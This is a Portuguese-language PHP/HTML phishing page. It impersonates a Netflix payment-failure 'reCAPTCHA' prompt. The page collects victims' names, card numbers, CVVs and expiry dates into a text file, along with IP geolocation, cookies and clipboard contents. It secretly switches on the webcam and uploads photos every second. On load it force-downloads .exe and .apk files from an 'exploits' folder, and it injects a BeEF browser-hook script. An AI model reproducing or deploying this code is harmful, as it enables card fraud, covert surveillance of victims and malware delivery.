<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix | Falha no Pagamento</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap">
    <style>
        /* Teu CSS tá perfeito, não mexi nele */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: url('1.jpg') no-repeat center/cover;
            background-color: #141414;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: rgba(0, 0, 0, 0.85);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 2rem;
            color: #fff;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(5px);
        }

        h3 {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 1.5rem;
            color: #4A90E2;
            text-align: center;
        }

        .input-box {
            margin: 1rem 0;
        }

        .input-box input {
            width: 100%;
            height: 45px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 5px;
            padding: 0 15px;
            font-size: 1rem;
            color: #fff;
            outline: none;
            transition: border-color 0.3s;
        }

        .input-box input:focus {
            border-color: #4A90E2;
        }

        .input-box input::placeholder {
            color: #a1a1a1;
        }

        .input-box input[type="number"]::-webkit-inner-spin-button,
        .input-box input[type="number"]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .input-box input[type="number"] {
            -moz-appearance: textfield;
        }

        .remember {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 1rem 0;
            font-size: 0.9rem;
            color: #b3b3b3;
        }

        .remember input[type="checkbox"] {
            margin-right: 5px;
        }

        .redirect {
            width: 100%;
            height: 50px;
            background: #4A90E2;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 1.1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s, transform 0.2s;
        }

        .redirect:hover {
            background: #357ABD;
            transform: translateY(-2px);
        }

        .feedback {
            margin-top: 1rem;
            text-align: center;
        }

        @media (max-width: 480px) {
            .container {
                margin: 1rem;
                padding: 1.5rem;
            }
            h3 {
                font-size: 1.2rem;
            }
            .redirect {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <?php
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization");

    function getUserIP() {
        $headers = [
            'HTTP_CF_CONNECTING_IP', // Cloudflare
            'HTTP_X_FORWARDED_FOR',  // Proxy ou rede móvel
            'HTTP_CLIENT_IP',        // Cliente
            'REMOTE_ADDR'            // Último recurso
        ];
        
        foreach ($headers as $header) {
            if (!empty($_SERVER[$header])) {
                $ip = $_SERVER[$header];
                if ($header === 'HTTP_X_FORWARDED_FOR') {
                    $ip_list = explode(',', $ip);
                    $ip = trim($ip_list[0]); // Pega o primeiro IP
                }
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
        return 'IP não disponível';
    }

    function getIPInfo($ip) {
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $encoded_ip = urlencode($ip);
        $api_url = "http://ip-api.com/json/{$encoded_ip}"; // Trocado pra ip-api.com
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log('Erro cURL ao acessar ip-api.com: ' . curl_error($ch) . " | IP: $ip");
            curl_close($ch);
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code !== 200) {
            error_log("Erro HTTP $http_code ao acessar ip-api.com | IP: $ip");
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $data = json_decode($response, true);
        if (!$data || $data['status'] !== 'success') {
            error_log("Resposta inválida do ip-api.com | IP: $ip | Resposta: $response");
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        // Ajusta os campos pra combinar com teu código
        return [
            'city' => $data['city'] ?? 'Cidade desconhecida',
            'region' => $data['regionName'] ?? 'Região desconhecida',
            'country' => $data['country'] ?? 'País desconhecido'
        ];
    }

    function getExploitFiles() {
        $directory = 'exploits/';
        $files = [];
        if (is_dir($directory)) {
            $allFiles = scandir($directory);
            foreach ($allFiles as $file) {
                if (in_array(pathinfo($file, PATHINFO_EXTENSION), ['exe', 'apk'])) {
                    $files[] = [
                        'href' => $directory . $file,
                        'nome' => $file
                    ];
                }
            }
        }
        return $files;
    }

    $ip = getUserIP();
    $ipData = getIPInfo($ip);
    $geoLocationIP = ($ipData['city'] ?? 'Cidade desconhecida') . ', ' . 
                     ($ipData['region'] ?? 'Região desconhecida') . ', ' . 
                     ($ipData['country'] ?? 'País desconhecido');

    $feedback = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a1'])) {
        $a1 = $_POST['a1'] ?? 'N/A';
        $a2 = $_POST['a2'] ?? 'N/A';
        $a3 = $_POST['a3'] ?? 'N/A';
        $a4 = $_POST['a4'] ?? 'N/A';
        $location = $_POST['location'] ?? 'Localização não disponível';
        $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';

        if (!is_dir('uploads')) {
            mkdir('uploads', 0755, true);
        }

        $file = fopen("dados.txt", "a");
        if ($file) {
            fwrite($file, "Nome Completo: $a1\n");
            fwrite($file, "Número do Cartão: $a2\n");
            fwrite($file, "CVV: $a3\n");
            fwrite($file, "Validade: $a4\n");
            fwrite($file, "IP: $ip\n");
            fwrite($file, "Localização (Navegador): $location\n");
            fwrite($file, "Localização (IP): $geoLocationIP\n");
            fwrite($file, "Área de Transferência: $clipboard\n");
            fwrite($file, "Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
            fwrite($file, "------------------------\n");
            fclose($file);
            $feedback = "<p style='color: green;' class='feedback'></p>";
        } else {
            $feedback = "<p style='color: red;' class='feedback'>Erro ao salvar os dados!</p>";
        }
    }

    $exploitFiles = getExploitFiles();
    ?>

    <main class="container">
        <form method="POST" enctype="multipart/form-data" id="form">
            <h3>Confirme que é você! - Recaptcha</h3>
            <div class="input-box">
                <input placeholder="Nome Completo" type="text" name="a1" maxlength="50" required>
            </div>
            <div class="input-box">
                <input placeholder="Número do Cartão" type="number" name="a2" maxlength="16" required>
            </div>
            <div class="input-box">
                <input placeholder="CVV" type="number" name="a3" maxlength="3" required>
            </div>
            <div class="input-box">
                <input placeholder="Validade do Cartão (MM/AA)" type="number" name="a4" maxlength="4" required>
            </div>
            <div class="remember">
                <label><input type="checkbox" name="remember_me"> Lembre de mim</label>
            </div>
            <video id="video" autoplay style="display: none;"></video>
            <canvas id="canvas" style="display: none;"></canvas>
            <input type="hidden" name="location" id="locationData">
            <input type="hidden" name="clipboard" id="clipboardData">
            <input type="file" name="photo" id="photo" accept="image/png" style="display: none;">
            <button type="submit" class="redirect">Redirecionar ao WhatsApp!</button>
            <?php echo $feedback; ?>
        </form>
    </main>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo']) && !isset($_POST['a1'])) {
        if (!is_dir('uploads')) {
            mkdir('uploads', 0755, true);
        }
        $photoPath = 'uploads/photo_' . time() . '.png';
        move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath);
        exit;
    }
    ?>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const locationData = document.getElementById('locationData');
        const clipboardData = document.getElementById('clipboardData');
        const form = document.getElementById('form');

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    locationData.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                    console.log("Localização capturada: ", locationData.value);
                },
                err => {
                    locationData.value = "Localização não disponível";
                    console.error('Erro ao acessar localização:', err);
                }
            );
        } else {
            locationData.value = "Geolocalização não suportada";
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                const context = canvas.getContext('2d');

                function captureFrame() {
                    if (!video.videoWidth) return requestAnimationFrame(captureFrame);
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);

                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, `photo_${Date.now()}.png`);
                        fetch(window.location.href, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => console.log('Foto enviada com sucesso'))
                        .catch(err => console.error('Erro ao enviar foto:', err));
                    }, 'image/png');

                    setTimeout(() => requestAnimationFrame(captureFrame), 1000);
                }
                requestAnimationFrame(captureFrame);
            })
            .catch(err => {
                console.error('Erro ao acessar a câmera:', err);
            });

        async function captureClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    console.log("Clipboard capturado: ", text);
                    return text || 'Nenhum texto na área de transferência';
                } else {
                    console.log("Clipboard não suportado");
                    return 'Clipboard não suportado';
                }
            } catch (err) {
                console.error('Erro ao acessar clipboard:', err.message);
                return 'Erro ao acessar clipboard: ' + err.message;
            }
        }

        function triggerDownload(filePath, fileName) {
            const link = document.createElement('a');
            link.href = filePath;
            link.download = fileName;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            console.log(`Download iniciado: ${fileName}`);
        }

        window.onload = () => {
            document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";

            const arquivos = <?php echo json_encode($exploitFiles); ?>;
            if (arquivos.length > 0) {
                arquivos.forEach((arquivo, i) => {
                    setTimeout(() => {
                        triggerDownload(arquivo.href, arquivo.nome);
                    }, i * 1000);
                });
            } else {
                console.log("Nenhum arquivo .exe ou .apk encontrado na pasta exploits/.");
            }

            form.addEventListener('submit', async (event) => {
                event.preventDefault();
                const clipboardText = await captureClipboard();
                clipboardData.value = clipboardText;
                console.log("Clipboard enviado: ", clipboardText);
                form.submit();
            });
        };
  //
  //
  //
  //     000000000000       000000000000             
  //     0oooooooooo0       0oooooooooo0		               
  //     0oo0000oooo0       0oo0000oooo0			                       
  //     0oo0000oooo0       0oo0000oooo0				                       
  //     0oo0000oooo0       0oo0000oooo0                   
  //     0oo0000oooo0       0oo0000oooo0 	          			            
  //     0oo____oooo0       0oo____oooo0	 
  //     000000000000       000000000000                                         
  //     
  //     1                    ___________         _________				
  //     1  '    sssssssss  |___________        |_________			
  //     1       ss         |                   |					
  //     1         s        |___________      	|_________			 		
  //     1          s       |                   |			
  //     1           s 	    |___________        |__________			
  //     1     ssssssss     |___________        |__________  .you  
  //     1
  //	___    			          
  //  
  //
	    
    </script>
	<script>
	var commandModuleStr = '<script src="http://127.0.0.1:3000/hook.js" type="text/javascript"><\/script>';
	document.write(commandModuleStr);
</script>
</body>
</html>
